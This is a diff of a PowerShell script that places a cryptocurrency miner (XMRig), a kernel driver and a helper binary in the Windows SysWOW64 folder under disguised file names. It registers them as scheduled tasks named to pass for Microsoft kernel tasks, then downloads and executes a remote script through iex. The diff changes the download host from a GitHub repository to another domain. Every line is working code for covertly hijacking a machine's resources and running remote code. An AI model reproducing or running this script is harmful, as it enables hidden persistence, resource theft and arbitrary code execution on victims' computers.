@@ -1,10 +1,10 @@
 cd $env:SystemRoot\SysWOW64
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/config.json -OutFile config.json
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/WinRing0x64.sys -OutFile WinRing0x64.sys
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/XMRig.xml -OutFile WinSvdX.xml
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/BES.xml -OutFile WinNaz.xml
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/xmrig.exe -OutFile WinXeNs.exe
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/crenata/xmrig-windows/master/BES.exe -OutFile WinOpac.exe
+Invoke-WebRequest -Uri https://metaunion.eu.org/config.json -OutFile config.json
+Invoke-WebRequest -Uri https://metaunion.eu.org/WinRing0x64.sys -OutFile WinRing0x64.sys
+Invoke-WebRequest -Uri https://metaunion.eu.org/XMRig.xml -OutFile WinSvdX.xml
+Invoke-WebRequest -Uri https://metaunion.eu.org/BES.xml -OutFile WinNaz.xml
+Invoke-WebRequest -Uri https://metaunion.eu.org/xmrig.exe -OutFile WinXeNs.exe
+Invoke-WebRequest -Uri https://metaunion.eu.org/BES.exe -OutFile WinOpac.exe
 schtasks /create /xml WinSvdX.xml /tn Microsoft\Windows\Kernel\WinXeNs
 schtasks /create /xml WinNaz.xml /tn Microsoft\Windows\Kernel\WinOpac
-iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/crenata/xmrig-windows/master/rickroll.ps1")
+iex (New-Object Net.WebClient).DownloadString("https://metaunion.eu.org/video.ps1")
